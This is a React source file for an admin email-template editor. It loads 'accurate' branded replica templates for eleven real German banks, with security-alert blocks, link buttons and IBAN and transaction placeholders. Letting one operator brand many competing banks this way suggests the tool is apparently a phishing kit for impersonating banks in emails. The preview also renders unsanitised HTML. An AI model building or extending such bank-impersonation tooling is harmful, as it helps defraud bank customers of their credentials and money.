import React, { useState, useEffect } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { ArrowLeft, Save, AlertCircle, Loader, Trash, Tag, Copy, Check, Code, Eye, Sparkles } from 'lucide-react';
import { useEmailTemplates } from '../hooks/useEmailTemplates';
import { toast } from 'react-toastify';
import { getBankBranding } from '../constants/bankEmailBranding';
import { EmailBuilder, EmailComponent } from '../components/CustomEmailBuilder/EmailBuilder';
import { generateEmailCSS } from '../utils/bankFonts';
import { createBankTemplate } from '../components/CustomEmailBuilder/BankTemplateLoader';

// Helper function to generate HTML from components with proper bank fonts
const generateHtmlFromComponents = (components: EmailComponent[], branding?: any): string => {
  const emailCSS = generateEmailCSS(branding?.name);
  
  const emailHtml = `<!DOCTYPE html>
<html lang="de" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="x-apple-disable-message-reformatting">
    <meta name="format-detection" content="telephone=no,address=no,email=no,date=no,url=no">
    <meta name="color-scheme" content="light dark">
    <meta name="supported-color-schemes" content="light dark">
    <title>{{subject}}</title>
    
    <!--[if mso]>
    <noscript>
        <xml>
            <o:OfficeDocumentSettings>
                <o:PixelsPerInch>96</o:PixelsPerInch>
            </o:OfficeDocumentSettings>
        </xml>
    </noscript>
    <![endif]-->
    
    <style>
        ${emailCSS}
    </style>
</head>
<body>
    <div class="email-container">
        ${components.map(comp => renderComponentToHtml(comp, branding)).join('')}
    </div>
</body>
</html>`;

  return emailHtml;
};

const renderComponentToHtml = (component: EmailComponent, branding?: any): string => {
  const { type, props, content } = component;
  
  switch (type) {
    case 'header':
      return `<div style="background-color: ${props.backgroundColor}; color: ${props.color}; padding: ${props.padding}; text-align: ${props.textAlign}; font-size: ${props.fontSize}; font-weight: ${props.fontWeight}; font-family: ${props.fontFamily || 'Arial, sans-serif'};"><h1 style="margin: 0; color: inherit; font-size: inherit; font-family: inherit;">${content}</h1></div>`;
    case 'text':
      return `<div style="background-color: ${props.backgroundColor}; color: ${props.color}; padding: ${props.padding}; text-align: ${props.textAlign}; font-size: ${props.fontSize}; font-weight: ${props.fontWeight || 'normal'}; font-family: ${props.fontFamily || 'Arial, sans-serif'}; line-height: ${props.lineHeight || '1.6'};"><p style="margin: 0; line-height: inherit;">${content?.replace(/\n/g, '<br>')}</p></div>`;
    case 'button':
      return `<div style="background-color: ${props.backgroundColor}; padding: ${props.padding}; text-align: ${props.textAlign};"><a href="${props.href || '#'}" style="display: inline-block; background-color: ${props.buttonBackgroundColor || props.backgroundColor}; color: ${props.color}; padding: ${props.buttonPadding || '16px 32px'}; text-decoration: none; border-radius: ${props.borderRadius}; font-weight: ${props.buttonFontWeight || 'bold'}; font-size: ${props.buttonFontSize || '16px'}; font-family: ${props.fontFamily || 'Arial, sans-serif'};">${content}</a></div>`;
    case 'alert':
      return `<div style="background-color: ${props.backgroundColor}; border: ${props.borderWidth || '2px'} ${props.borderStyle || 'solid'} ${props.borderColor || '#ef4444'}; border-radius: ${props.borderRadius || '8px'}; padding: ${props.padding}; text-align: ${props.textAlign}; margin: ${props.margin || '20px 0'};"><div style="color: ${props.color || '#dc2626'}; font-weight: bold; font-family: ${props.fontFamily || 'Arial, sans-serif'};">${content?.replace(/\n/g, '<br>')}</div></div>`;
    case 'table':
      return `<div style="background-color: ${props.backgroundColor || '#f8f9fa'}; padding: ${props.padding || '20px'}; margin: ${props.margin || '20px 0'}; border-radius: ${props.borderRadius || '8px'}; border-left: 4px solid ${props.borderColor || branding?.primaryColor || '#dc2626'};"><h3 style="margin: 0 0 15px 0; color: ${props.borderColor || branding?.primaryColor || '#dc2626'}; font-size: 18px; font-family: ${props.fontFamily || 'Arial, sans-serif'};">${props.tableTitle || 'Transaktionsdetails'}</h3><table style="width: 100%; border-collapse: collapse; font-size: 14px; font-family: ${props.fontFamily || 'Arial, sans-serif'};"><tr style="border-bottom: 1px solid #e5e7eb;"><td style="padding: 8px 0; font-weight: bold; color: #374151;">${props.dateLabel || 'Datum:'}:</td><td style="padding: 8px 0; color: ${props.borderColor || branding?.primaryColor || '#dc2626'};">${props.dateValue || '{{date}}'}</td></tr><tr style="border-bottom: 1px solid #e5e7eb;"><td style="padding: 8px 0; font-weight: bold; color: #374151;">${props.amountLabel || 'Betrag:'}:</td><td style="padding: 8px 0; color: ${props.borderColor || branding?.primaryColor || '#dc2626'}; font-weight: bold;">${props.amountValue || '{{amount}}'}</td></tr><tr style="border-bottom: 1px solid #e5e7eb;"><td style="padding: 8px 0; font-weight: bold; color: #374151;">${props.accountLabel || 'Konto:'}:</td><td style="padding: 8px 0; color: #374151;">${props.accountValue || '{{accountNumber}}'}</td></tr><tr><td style="padding: 8px 0; font-weight: bold; color: #374151;">${props.referenceLabel || 'Referenz:'}:</td><td style="padding: 8px 0; color: #374151;">${props.referenceValue || '{{transactionId}}'}</td></tr></table></div>`;
    case 'footer':
      return `<div style="background-color: ${props.backgroundColor || '#f8f9fa'}; color: ${props.color || '#666666'}; padding: ${props.padding || '30px 20px'}; text-align: ${props.textAlign || 'center'}; font-size: ${props.fontSize || '14px'}; font-family: ${props.fontFamily || 'Arial, sans-serif'}; border-top: ${props.borderTopWidth || '3px'} ${props.borderTopStyle || 'solid'} ${props.borderTopColor || branding?.primaryColor || '#dc2626'};"><div style="font-weight: bold; margin-bottom: 10px;">${content?.split('\n')[0]}</div><div style="font-size: 12px;">${content?.split('\n').slice(1).join('<br>')}</div></div>`;
    case 'spacer':
      return `<div style="height: ${props.height || '20px'};"></div>`;
    default:
      return `<div>${content}</div>`;
  }
};

// Function to personalize preview content with test data
const personalizePreview = (html: string, data: Record<string, string>) => {
  let result = html;
  
  // Replace {{variable}} placeholders with actual values
  Object.entries(data).forEach(([key, value]) => {
    const regex = new RegExp(`{{\s*${key}\s*}}`, 'g');
    result = result.replace(regex, value);
  });
  
  return result;
};

export const CustomEmailTemplateEditor: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const isEditMode = id !== 'new';
  
  const {
    isLoading: isLoadingTemplates,
    fetchTemplate,
    createTemplate,
    updateTemplate,
    deleteTemplate,
    isCreating,
    isUpdating,
    isDeleting
  } = useEmailTemplates();

  const [name, setName] = useState('');
  const [subject, setSubject] = useState('');
  const [bankName, setBankName] = useState('');
  const [templateType, setTemplateType] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);
  const [showVariablesHelper, setShowVariablesHelper] = useState(false);
  const [showTemplatePreview, setShowTemplatePreview] = useState(false);
  const [copied, setCopied] = useState('');
  const [editorMode, setEditorMode] = useState<'visual' | 'code' | 'preview'>('visual');
  const [components, setComponents] = useState<EmailComponent[]>([]);
  const [htmlContent, setHtmlContent] = useState('');
  const [previewData, setPreviewData] = useState({
    email: 'kunde@example.com',
    firstName: 'Max',
    lastName: 'Mustermann',
    fullName: 'Max Mustermann',
    accountNumber: 'DE89 3704 0044 0532 0130 00',
    amount: '250,00 €',
    date: new Date().toLocaleDateString('de-DE'),
    transactionId: 'TXN-123456789'
  });


  useEffect(() => {
    const loadTemplate = async () => {
      if (isEditMode && id) {
        try {
          setIsLoading(true);
          const template = await fetchTemplate(parseInt(id));
          setName(template.name);
          setSubject(template.subject);
          setHtmlContent(template.html_content);
          setBankName(template.bank_name || '');
          setTemplateType(template.template_type || '');
          
           // Load component design if available
           if (template.design_json) {
             try {
               const savedComponents = JSON.parse(template.design_json);
               setComponents(savedComponents);
             } catch (err) {
               console.error('Error loading component design:', err);
               toast.warning('Design konnte nicht geladen werden.');
             }
           }
        } catch (err) {
          setError('Fehler beim Laden der E-Mail-Vorlage. Bitte versuchen Sie es später erneut.');
          console.error('Error loading template:', err);
        } finally {
          setIsLoading(false);
        }
       } else {
         // Start with empty components for new template
         setComponents([]);
       }
    };

    loadTemplate();
  }, [isEditMode, id, fetchTemplate, bankName]);

  const handleSave = async () => {
    if (!name || !subject) {
      setError('Bitte füllen Sie Name und Betreff aus.');
      return;
    }

    try {
      let finalHtml = '';
      let finalMjml = '';

      if (editorMode === 'visual') {
        // Use components from visual builder
        if (components.length === 0) {
          setError('Bitte fügen Sie mindestens eine Komponente hinzu.');
          return;
        }
        
        // Generate HTML from components (this will be implemented in EmailBuilder)
        finalHtml = htmlContent; // Will be set by EmailBuilder onSave
        finalMjml = JSON.stringify(components); // Store components as design JSON
      } else if (editorMode === 'code') {
        // Use HTML from code editor
        if (!htmlContent) {
          setError('Bitte fügen Sie HTML-Code hinzu.');
          return;
        }
        
        finalHtml = htmlContent;
        finalMjml = JSON.stringify(components);
      } else {
        // Use existing HTML content
        finalHtml = htmlContent;
        finalMjml = JSON.stringify(components);
      }

      const templateData = {
        name,
        subject,
        html_content: finalHtml,
        design_json: finalMjml, // Store components for re-editing
        category: bankName || '',
        bank_name: bankName || undefined,
        template_type: templateType || undefined
      };
      
      if (isEditMode && id) {
        await updateTemplate({ ...templateData, id: parseInt(id) });
        toast.success('E-Mail-Vorlage erfolgreich aktualisiert!');
      } else {
        await createTemplate(templateData);
        toast.success('E-Mail-Vorlage erfolgreich erstellt!');
      }
      
      navigate('/admin/email-templates');
    } catch (err) {
      setError('Fehler beim Speichern der E-Mail-Vorlage. Bitte versuchen Sie es später erneut.');
      console.error('Error saving template:', err);
      toast.error('Fehler beim Speichern der Vorlage');
    }
  };

  const handleDelete = async () => {
    if (!isEditMode || !id) return;
    
    try {
      await deleteTemplate(parseInt(id));
      toast.success('E-Mail-Vorlage erfolgreich gelöscht!');
      navigate('/admin/email-templates');
    } catch (err) {
      setError('Fehler beim Löschen der E-Mail-Vorlage. Bitte versuchen Sie es später erneut.');
      console.error('Error deleting template:', err);
      toast.error('Fehler beim Löschen der Vorlage');
    }
  };

  const loadBankTemplate = () => {
    if (!bankName) {
      toast.error('Bitte wählen Sie zuerst eine Bank aus');
      return;
    }

    const branding = getBankBranding(bankName);
    if (!branding) {
      toast.error('Branding für diese Bank nicht gefunden');
      return;
    }

    // ✅ Use accurate bank template loader
    const bankComponents = createBankTemplate(bankName);
    
    if (bankComponents.length === 0) {
      toast.error('Template für diese Bank nicht verfügbar');
      return;
    }
    
    setComponents(bankComponents);
    
    // ✅ Generate HTML from accurate components
    const generatedHtml = generateHtmlFromComponents(bankComponents, branding);
    setHtmlContent(generatedHtml);
    
    toast.success(`${branding.displayName} Vorlage mit ${bankComponents.length} professionellen Komponenten geladen!`);
  };

  const handleModeSwitch = async (mode: 'visual' | 'code' | 'preview') => {
    if (mode === 'preview' && editorMode === 'visual') {
      // Generate HTML from components for preview
      if (components.length > 0) {
        const generatedHtml = generateHtmlFromComponents(components, bankName ? getBankBranding(bankName) : undefined);
        setHtmlContent(generatedHtml);
      }
    }
    
    setEditorMode(mode);
  };

  if (isLoading || isLoadingTemplates) {
    return (
      <div className="flex justify-center items-center h-64">
        <Loader className="h-8 w-8 text-red-600 animate-spin" />
        <span className="ml-2 text-gray-600">Lade E-Mail-Vorlage...</span>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center pb-4 border-b border-gray-200">
        <div className="flex items-center">
          <button
            onClick={() => navigate('/admin/email-templates')}
            className="mr-4 p-2 rounded-full hover:bg-gray-100"
          >
            <ArrowLeft size={20} className="text-gray-600" />
          </button>
          <h1 className="text-2xl font-bold text-gray-900">
            {isEditMode ? 'E-Mail-Vorlage bearbeiten' : 'Neue E-Mail-Vorlage erstellen'}
          </h1>
           <div className="ml-4 px-3 py-1 bg-green-100 text-green-800 rounded-full text-sm font-medium">
             Custom Visual Builder
           </div>
        </div>
        <div className="flex space-x-3">
          {isEditMode && (
            <button
              onClick={() => setShowDeleteConfirm(true)}
              className="px-4 py-2 border border-red-300 text-red-600 rounded-md hover:bg-red-50"
              disabled={isDeleting}
            >
              <Trash size={18} className="inline-block mr-1" />
              Löschen
            </button>
          )}
          <button
            onClick={handleSave}
            className="px-6 py-2.5 bg-red-600 text-white rounded-md hover:bg-red-700 focus:ring-2 focus:ring-red-500 focus:ring-offset-2 disabled:opacity-50 shadow-sm transition-all duration-200 ease-in-out flex items-center"
            disabled={isCreating || isUpdating}
          >
            <Save size={18} className="mr-2" />
            {isCreating || isUpdating ? 'Wird gespeichert...' : 'Speichern'}
          </button>
        </div>
      </div>

      {error && (
        <div className="bg-red-50 border-l-4 border-red-400 p-4 flex items-start">
          <AlertCircle className="h-5 w-5 text-red-500 mr-2 flex-shrink-0 mt-0.5" />
          <div>
            <p className="text-red-700">{error}</p>
            <button
              onClick={() => setError(null)}
              className="text-red-500 text-sm hover:underline mt-1"
            >
              Schließen
            </button>
          </div>
        </div>
      )}

      {/* Template metadata fields */}
      <div className="bg-white shadow rounded-lg p-6">
        <h2 className="text-lg font-semibold text-gray-900 mb-4">Vorlageninformationen</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <label htmlFor="name" className="block text-sm font-semibold text-gray-700 mb-2">
              Name der Vorlage <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              id="name"
              value={name}
              onChange={(e) => setName(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
              placeholder="Name der E-Mail-Vorlage eingeben"
              required
            />
          </div>
          
          <div>
            <label htmlFor="subject" className="block text-sm font-semibold text-gray-700 mb-2">
              E-Mail-Betreff <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              id="subject"
              value={subject}
              onChange={(e) => setSubject(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
              placeholder="Betreffzeile der E-Mail eingeben"
              required
            />
          </div>
          
          <div>
            <label htmlFor="bankName" className="block text-sm font-semibold text-gray-700 mb-2">
              Bank
            </label>
            <select
              id="bankName"
              value={bankName}
              onChange={(e) => setBankName(e.target.value)}
              className="block w-full px-4 py-3 pr-10 rounded-md border-gray-300 bg-white focus:ring-2 focus:ring-red-500 focus:border-red-500 transition-all duration-200 ease-in-out shadow-sm appearance-none sm:text-sm"
            >
              <option value="">-- Wählen Sie eine Bank --</option>
              <option value="commerzbank">Commerzbank</option>
              <option value="santander">Santander</option>
              <option value="apobank">Apobank</option>
              <option value="sparkasse">Sparkasse</option>
              <option value="postbank">Postbank</option>
              <option value="dkb">DKB</option>
              <option value="volksbank">Volksbank</option>
              <option value="comdirect">Comdirect</option>
              <option value="consorsbank">Consorsbank</option>
              <option value="ingdiba">ING DiBa</option>
              <option value="deutsche_bank">Deutsche Bank</option>
            </select>
          </div>
          
          <div>
            <label htmlFor="templateType" className="block text-sm font-semibold text-gray-700 mb-2">
              Template-Typ
            </label>
            <select
              id="templateType"
              value={templateType}
              onChange={(e) => setTemplateType(e.target.value)}
              className="block w-full px-4 py-3 pr-10 rounded-md border-gray-300 bg-white focus:ring-2 focus:ring-red-500 focus:border-red-500 transition-all duration-200 ease-in-out shadow-sm appearance-none sm:text-sm"
            >
              <option value="">-- Wählen Sie einen Template-Typ --</option>
              <option value="welcome">Willkommen/Onboarding</option>
              <option value="security">Sicherheit & Verifizierung</option>
              <option value="transaction">Transaktions-Benachrichtigungen</option>
              <option value="marketing">Marketing & Werbung</option>
              <option value="support">Support & Service</option>
            </select>
          </div>
        </div>
        
        {bankName && (
          <div className="mt-4 p-4 bg-gradient-to-r from-green-50 to-blue-50 border border-green-200 rounded-lg">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <div className="w-3 h-3 rounded-full bg-green-500 mr-2 animate-pulse"></div>
                 <span className="text-sm font-medium text-gray-700">
                   {getBankBranding(bankName)?.displayName} Branding aktiv - Visual Builder
                 </span>
              </div>
              <div className="flex space-x-2">
                <button
                  onClick={() => setShowTemplatePreview(true)}
                  className="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 text-sm font-medium flex items-center"
                >
                   <Eye size={16} className="mr-1" />
                   Vorlage-Vorschau
                </button>
                <button
                  onClick={loadBankTemplate}
                  className="px-4 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 text-sm font-medium flex items-center"
                >
                   <Sparkles size={16} className="mr-1" />
                   Bank-Vorlage laden
                </button>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Editor mode toggle */}
      <div className="flex space-x-4 mb-6">
        <button
          type="button"
          onClick={() => handleModeSwitch('visual')}
          className={`px-6 py-2.5 rounded-md flex items-center shadow-sm transition-all duration-200 ease-in-out ${
            editorMode === 'visual'
              ? 'bg-red-600 text-white hover:bg-red-700 ring-2 ring-red-500 ring-offset-2'
              : 'bg-white text-gray-700 border border-gray-300 hover:bg-gray-50'
          }`}
        >
           <Sparkles size={18} className="mr-2" />
           Visueller Builder
        </button>
        <button
          type="button"
          onClick={() => handleModeSwitch('code')}
          className={`px-6 py-2.5 rounded-md flex items-center shadow-sm transition-all duration-200 ease-in-out ${
            editorMode === 'code'
              ? 'bg-red-600 text-white hover:bg-red-700 ring-2 ring-red-500 ring-offset-2'
              : 'bg-white text-gray-700 border border-gray-300 hover:bg-gray-50'
          }`}
        >
           <Code size={18} className="mr-2" />
           HTML-Code
        </button>
        <button
          type="button"
          onClick={() => handleModeSwitch('preview')}
          className={`px-6 py-2.5 rounded-md flex items-center shadow-sm transition-all duration-200 ease-in-out ${
            editorMode === 'preview'
              ? 'bg-red-600 text-white hover:bg-red-700 ring-2 ring-red-500 ring-offset-2'
              : 'bg-white text-gray-700 border border-gray-300 hover:bg-gray-50'
          }`}
        >
          <Eye size={18} className="mr-2" />
          Vorschau
        </button>
        <button
          type="button"
          onClick={() => setShowVariablesHelper(true)}
          className="px-6 py-2.5 rounded-md flex items-center shadow-sm transition-all duration-200 ease-in-out bg-white text-gray-700 border border-gray-300 hover:bg-gray-50"
        >
          <Tag size={18} className="mr-2" />
          Variablen
        </button>
      </div>

       {/* Visual Editor */}
       {editorMode === 'visual' && (
         <div className="bg-white shadow rounded-lg overflow-hidden" style={{ height: '700px' }}>
           <EmailBuilder
             key={`${bankName}-${components.length}`}
             bankBranding={bankName ? getBankBranding(bankName) || undefined : undefined}
             initialComponents={components}
             onSave={(newComponents, html) => {
               console.log('✅ Custom Email Builder Save:', { components: newComponents, html });
               setComponents(newComponents);
               setHtmlContent(html);
               toast.success('Template im visuellen Editor gespeichert!');
             }}
             height="700px"
           />
         </div>
       )}

       {/* HTML Code Editor */}
       {editorMode === 'code' && (
         <div className="bg-white shadow rounded-lg p-6">
           <div className="flex justify-between items-center mb-4">
             <h2 className="text-lg font-semibold text-gray-900">HTML-Code bearbeiten</h2>
             <div className="flex items-center space-x-2">
               <span className="text-xs text-gray-500">
                 {components.length} Komponenten → HTML
               </span>
               <button
                 onClick={() => {
                   // Generate HTML from current components
                   const generatedHtml = generateHtmlFromComponents(components, bankName ? getBankBranding(bankName) : undefined);
                   setHtmlContent(generatedHtml);
                   toast.success('HTML aus Komponenten generiert!');
                 }}
                 className="px-3 py-1 bg-green-600 text-white rounded text-xs hover:bg-green-700"
               >
                 HTML generieren
               </button>
             </div>
           </div>
           <textarea
             value={htmlContent}
             onChange={(e) => setHtmlContent(e.target.value)}
             className="w-full h-96 px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors font-mono"
             spellCheck="false"
             placeholder="HTML-Code hier bearbeiten..."
           />
           <p className="mt-2 text-sm text-gray-500">
             HTML-Code für E-Mail-Versand. Verwenden Sie {`{{firstName}}`} für Personalisierung.
           </p>
         </div>
       )}

      {/* Preview */}
      {editorMode === 'preview' && (
        <div className="bg-white border rounded-lg shadow-sm">
          <div className="border-b border-gray-200 bg-gray-50 px-4 py-3 flex justify-between items-center">
            <div>
              <h3 className="text-sm font-medium text-gray-700">Vorschau: {subject}</h3>
              <p className="text-xs text-gray-500 mt-1">Bank: {getBankBranding(bankName)?.displayName || 'Keine Bank'}</p>
            </div>
          </div>
          <div className="p-6 overflow-auto" style={{ maxHeight: '60vh' }}>
            <div className="mb-4 p-3 bg-gray-50 border border-gray-200 rounded-md">
              <h4 className="text-sm font-medium text-gray-700 mb-2">Personalisierungsdaten:</h4>
              <div className="grid grid-cols-2 gap-2">
                {Object.entries(previewData).map(([key, value]) => (
                  <div key={key} className="flex items-center">
                    <span className="text-xs text-gray-500 mr-1">{key}:</span>
                    <input
                      type="text"
                      value={value}
                      onChange={(e) => setPreviewData({...previewData, [key]: e.target.value})}
                      className="text-xs p-1 border border-gray-300 rounded w-full"
                    />
                  </div>
                ))}
              </div>
            </div>
            <div 
              className="email-preview"
              dangerouslySetInnerHTML={{ __html: personalizePreview(htmlContent, previewData) }} 
            />
          </div>
        </div>
      )}

      {/* Variables Helper Modal */}
      {showVariablesHelper && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-xl max-w-2xl w-full p-6 max-h-[80vh] overflow-auto">
            <div className="flex justify-between items-center mb-4">
               <h3 className="text-lg font-medium text-gray-900">Personalisierungsvariablen</h3>
              <button
                onClick={() => setShowVariablesHelper(false)}
                className="text-gray-400 hover:text-gray-500"
              >
                <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            
             <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-4">
               <p className="text-sm text-green-800">
                 <strong>🎨 Custom Visual Builder:</strong> Diese Variablen funktionieren in allen Komponenten und im HTML-Code.
               </p>
             </div>
            
            <div className="space-y-4">
              <div>
                <h4 className="text-sm font-medium text-gray-700 mb-3">Empfängerdaten</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                  {[
                    { name: 'email', desc: 'E-Mail-Adresse', sample: 'kunde@example.com' },
                    { name: 'firstName', desc: 'Vorname', sample: 'Max' },
                    { name: 'lastName', desc: 'Nachname', sample: 'Mustermann' },
                    { name: 'fullName', desc: 'Vollständiger Name', sample: 'Max Mustermann' }
                  ].map(variable => (
                    <button
                      key={variable.name}
                      onClick={() => {
                        navigator.clipboard.writeText(`{{${variable.name}}}`);
                        setCopied(variable.name);
                        setTimeout(() => setCopied(''), 2000);
                        toast.success(`{{${variable.name}}} kopiert`);
                      }}
                      className="flex items-center justify-between p-3 border border-gray-200 rounded-md hover:bg-gray-50 text-left"
                    >
                      <div className="flex-1">
                        <code className="text-sm font-mono text-red-600 font-semibold">{`{{${variable.name}}}`}</code>
                        <p className="text-xs text-gray-500 mt-1">{variable.desc}</p>
                        <p className="text-xs text-gray-400 mt-0.5">{variable.sample}</p>
                      </div>
                      {copied === variable.name ? (
                        <Check size={16} className="text-green-500 ml-2" />
                      ) : (
                        <Copy size={16} className="text-gray-400 ml-2" />
                      )}
                    </button>
                  ))}
                </div>
              </div>
              
              <div>
                <h4 className="text-sm font-medium text-gray-700 mb-3">Bankdaten</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                  {[
                    { name: 'accountNumber', desc: 'IBAN', sample: 'DE89 3704 0044 0532 0130 00' },
                    { name: 'amount', desc: 'Betrag', sample: '250,00 €' },
                    { name: 'date', desc: 'Datum', sample: new Date().toLocaleDateString('de-DE') },
                    { name: 'transactionId', desc: 'Transaktions-ID', sample: 'TXN-123456789' }
                  ].map(variable => (
                    <button
                      key={variable.name}
                      onClick={() => {
                        navigator.clipboard.writeText(`{{${variable.name}}}`);
                        setCopied(variable.name);
                        setTimeout(() => setCopied(''), 2000);
                        toast.success(`{{${variable.name}}} kopiert`);
                      }}
                      className="flex items-center justify-between p-3 border border-gray-200 rounded-md hover:bg-gray-50 text-left"
                    >
                      <div className="flex-1">
                        <code className="text-sm font-mono text-red-600 font-semibold">{`{{${variable.name}}}`}</code>
                        <p className="text-xs text-gray-500 mt-1">{variable.desc}</p>
                        <p className="text-xs text-gray-400 mt-0.5">{variable.sample}</p>
                      </div>
                      {copied === variable.name ? (
                        <Check size={16} className="text-green-500 ml-2" />
                      ) : (
                        <Copy size={16} className="text-gray-400 ml-2" />
                      )}
                    </button>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Delete confirmation modal */}
      {showDeleteConfirm && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-xl max-w-md w-full p-6">
            <div className="flex items-center mb-4">
              <div className="flex-shrink-0 w-12 h-12 rounded-full bg-red-100 flex items-center justify-center">
                <Trash className="h-6 w-6 text-red-600" />
              </div>
              <h3 className="ml-4 text-lg font-medium text-gray-900">E-Mail-Vorlage löschen</h3>
            </div>
            <p className="text-gray-600 mb-6">
              Sind Sie sicher, dass Sie diese E-Mail-Vorlage löschen möchten? Diese Aktion kann nicht rückgängig gemacht werden.
            </p>
            <div className="flex justify-end space-x-3">
              <button
                onClick={() => setShowDeleteConfirm(false)}
                className="px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50"
              >
                Abbrechen
              </button>
              <button
                onClick={handleDelete}
                className="px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-red-600 hover:bg-red-700 disabled:opacity-50"
                disabled={isDeleting}
              >
                {isDeleting ? 'Wird gelöscht...' : 'Löschen bestätigen'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Template Preview Modal */}
      {showTemplatePreview && bankName && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-lg shadow-xl max-w-4xl w-full max-h-[90vh] overflow-hidden">
            <div className="flex items-center justify-between p-4 border-b border-gray-200">
              <h3 className="text-lg font-semibold text-gray-900">
                {getBankBranding(bankName)?.displayName} Template Vorschau
              </h3>
              <button
                onClick={() => setShowTemplatePreview(false)}
                className="text-gray-400 hover:text-gray-600"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            
            <div className="p-6 overflow-y-auto max-h-[70vh]">
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* Template Components Preview */}
                <div>
                  <h4 className="text-md font-semibold text-gray-800 mb-3">Template Komponenten:</h4>
                  <div className="space-y-2 text-sm">
                    {createBankTemplate(bankName).map((comp, index) => (
                      <div key={comp.id} className="flex items-center p-2 bg-gray-50 rounded">
                        <div className="w-6 h-6 bg-blue-100 rounded flex items-center justify-center mr-3">
                          {index + 1}
                        </div>
                        <div>
                          <div className="font-medium text-gray-900">
                            {comp.type === 'header' && '🏦 Header'}
                            {comp.type === 'alert' && '⚠️ Sicherheitswarnung'}
                            {comp.type === 'text' && '📝 Text Block'}
                            {comp.type === 'button' && '🔘 Button'}
                            {comp.type === 'table' && '📊 Tabelle'}
                            {comp.type === 'footer' && '📞 Footer'}
                          </div>
                          <div className="text-xs text-gray-500">
                            {comp.content?.substring(0, 50)}...
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                
                {/* Bank Branding Info */}
                <div>
                  <h4 className="text-md font-semibold text-gray-800 mb-3">Bank Branding:</h4>
                  <div className="space-y-3 text-sm">
                    <div className="flex items-center">
                      <div 
                        className="w-6 h-6 rounded mr-3 border border-gray-300"
                        style={{ backgroundColor: getBankBranding(bankName)?.primaryColor }}
                      ></div>
                      <span>Primärfarbe: {getBankBranding(bankName)?.primaryColor}</span>
                    </div>
                    <div className="flex items-center">
                      <div 
                        className="w-6 h-6 rounded mr-3 border border-gray-300"
                        style={{ backgroundColor: getBankBranding(bankName)?.secondaryColor }}
                      ></div>
                      <span>Sekundärfarbe: {getBankBranding(bankName)?.secondaryColor}</span>
                    </div>
                    <div>
                      <span className="font-medium">Schriftarten:</span> {getBankBranding(bankName)?.fonts.join(', ')}
                    </div>
                    <div>
                      <span className="font-medium">Support:</span> {getBankBranding(bankName)?.supportPhone}
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mt-6 pt-4 border-t border-gray-200">
                <button
                  onClick={() => {
                    setShowTemplatePreview(false);
                    loadBankTemplate();
                  }}
                  className="w-full px-4 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 text-sm font-medium"
                >
                  Template laden und bearbeiten
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
